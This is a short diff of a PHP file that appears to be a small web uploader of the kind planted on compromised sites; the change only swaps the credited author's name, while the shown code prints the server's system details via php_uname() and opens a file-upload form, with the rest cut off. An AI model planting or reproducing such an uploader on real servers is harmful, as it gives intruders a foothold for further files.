@@ -1,5 +1,5 @@
 <?php
-echo "Uploader By Prabesh Sapkota<br>";
+echo "Uploader By Mr Kingsman<br>";
 echo "<b>".php_uname()."</b><br>";
 echo "<form method='post' enctype='multipart/form-data'>
 	  <input type='file' name='updlf'>
